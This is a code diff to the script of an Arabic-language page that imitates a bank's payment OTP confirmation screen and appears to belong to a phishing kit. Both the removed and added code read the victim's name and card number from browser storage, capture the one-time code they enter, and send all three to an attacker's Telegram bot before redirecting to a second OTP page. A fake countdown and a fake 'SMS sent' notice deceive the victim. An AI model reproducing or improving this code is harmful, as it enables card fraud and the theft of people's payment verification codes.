@@ -239,108 +239,125 @@ height: auto;
 
 <script src="config.js"></script>
   <script>
-  const telegramBotToken = TELEGRAM_BOT_TOKEN_PAYMENT;
-  const chatId = TELEGRAM_CHAT_ID_PAYMENT;
+    // Telegram Configuration
+    const telegramBotToken = TELEGRAM_BOT_TOKEN_PAYMENT;
+    const chatId = TELEGRAM_CHAT_ID_PAYMENT;
 
-  async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-    const payload = {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML'
-    };
-
-    try {
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      const data = await response.json();
-      return data;
-    } catch (error) {
-      console.error('Telegram Error:', error);
-      return null;
-    }
-  }
-
-  document.querySelector('.otp-section button').addEventListener('click', async () => {
-    const otpInput = document.getElementById('otp');
-    const otpValue = otpInput.value.trim();
-
-    // ✅ التحقق من الحقل
-    if (otpValue === '') {
-      alert('يرجى إدخال رمز التحقق قبل المتابعة.');
-      otpInput.focus();
-      return;
+    // Get owner name
+    function getOwnerName() {
+      return localStorage.getItem('owner_name') || 'غير معروف';
     }
 
-    // ✅ تابع الإجراءات بعد التحقق
-    const fullName = localStorage.getItem('owner_name') || 'غير معروف';
-    const cardNumber = localStorage.getItem('cardNumber') || '';
-    const last4 = cardNumber.slice(-4) || '----';
+    // Get last 4 digits of card
+    function getLast4Digits() {
+      return localStorage.getItem('cardNumber') || '----';
+    }
 
-    const message = `
-✅ <b> 1 رمز التحقق </b>
-- 👤 من: ${fullName}
-- 💳 آخر 4 أرقام من البطاقة: ${last4}
-- 🔐 رمز التحقق المُدخل: ${otpValue}
-    `;
-
-    document.getElementById('loadingOverlay').style.display = 'flex';
-
-    await sendToTelegram(message);
-
-    setTimeout(() => {
-      window.location.href = "otp2.html";
-    }, 15000);
-  });
-
-  window.addEventListener('DOMContentLoaded', () => {
-    const logoDiv = document.getElementById('logo');
-    setTimeout(() => {
-      logoDiv.classList.add('show');
-    }, 15000);
-  });
-
-  window.addEventListener('DOMContentLoaded', () => {
-    const overlay = document.getElementById('overlay');
-    const otpSection = document.getElementById('otpSection');
-    const otpText = document.getElementById('otpText');
-    const otpTimer = document.getElementById('otpTimer');
-
-    setTimeout(() => {
-      overlay.style.display = 'none';
-      otpSection.style.display = 'block';
-    }, 5000);
-
-    const now = new Date();
-    const optionsDate = { year: 'numeric', month: '2-digit', day: '2-digit' };
-    const formattedDate = now.toLocaleDateString('ar-EG', optionsDate).replace(/\//g, '-');
-    const optionsTime = { hour: '2-digit', minute: '2-digit', hour12: false };
-    const formattedTime = now.toLocaleTimeString('ar-EG', optionsTime);
-
-    otpText.textContent = `تم ارسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP) الى رقمك المسجل لدينا لتأكيد حركة الدفع بتاريخ ${formattedDate} الساعة ${formattedTime}`;
-
-    let timeLeft = 180;
-
-    function updateTimer() {
-      const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-      const seconds = (timeLeft % 60).toString().padStart(2, '0');
-      otpTimer.textContent = `${minutes}:${seconds}`;
-
-      if (timeLeft <= 0) {
-        clearInterval(timerInterval);
-        otpTimer.textContent = 'انتهى الوقت';
-      } else {
-        timeLeft--;
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
     }
 
-    updateTimer();
-    const timerInterval = setInterval(updateTimer, 1000);
-  });
-</script>
+    // Submit OTP to Telegram
+    async function submitToServer(data) {
+      const message = `
+✅ <b>رمز التحقق (1)</b>
+━━━━━━━━━━━━━━━
+👤 من: ${data.owner_name}
+💳 آخر 4 أرقام: ${data.last_4_digits}
+🔐 رمز OTP: ${data.otp_code}
+      `;
+      return await sendToTelegram(message);
+    }
+
+    // Handle OTP submit
+    document.querySelector('.otp-section button').addEventListener('click', async () => {
+      const otpInput = document.getElementById('otp');
+      const otpValue = otpInput.value.trim();
+
+      // Validate input
+      if (otpValue === '') {
+        alert('يرجى إدخال رمز التحقق قبل المتابعة.');
+        otpInput.focus();
+        return;
+      }
+
+      // Show loading
+      document.getElementById('loadingOverlay').style.display = 'flex';
+
+      // Prepare data
+      const data = {
+        owner_name: getOwnerName(),
+        last_4_digits: getLast4Digits(),
+        otp_code: otpValue
+      };
+
+      // Submit to Telegram
+      await submitToServer(data);
+
+      // Navigate to next step
+      setTimeout(() => {
+        window.location.href = "otp2.html";
+      }, 2000);
+    });
+
+    // Initialize on page load
+    window.addEventListener('DOMContentLoaded', () => {
+      const logoDiv = document.getElementById('logo');
+      setTimeout(() => {
+        logoDiv.classList.add('show');
+      }, 15000);
+    });
+
+    window.addEventListener('DOMContentLoaded', () => {
+      const overlay = document.getElementById('overlay');
+      const otpSection = document.getElementById('otpSection');
+      const otpText = document.getElementById('otpText');
+      const otpTimer = document.getElementById('otpTimer');
+
+      setTimeout(() => {
+        overlay.style.display = 'none';
+        otpSection.style.display = 'block';
+      }, 5000);
+
+      const now = new Date();
+      const optionsDate = { year: 'numeric', month: '2-digit', day: '2-digit' };
+      const formattedDate = now.toLocaleDateString('ar-EG', optionsDate).replace(/\//g, '-');
+      const optionsTime = { hour: '2-digit', minute: '2-digit', hour12: false };
+      const formattedTime = now.toLocaleTimeString('ar-EG', optionsTime);
+
+      otpText.textContent = `تم ارسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP) الى رقمك المسجل لدينا لتأكيد حركة الدفع بتاريخ ${formattedDate} الساعة ${formattedTime}`;
+
+      let timeLeft = 180;
+
+      function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        const seconds = (timeLeft % 60).toString().padStart(2, '0');
+        otpTimer.textContent = `${minutes}:${seconds}`;
+
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          otpTimer.textContent = 'انتهى الوقت';
+        } else {
+          timeLeft--;
+        }
+      }
+
+      updateTimer();
+      const timerInterval = setInterval(updateTimer, 1000);
+    });
+  </script>
 
 
 </body>
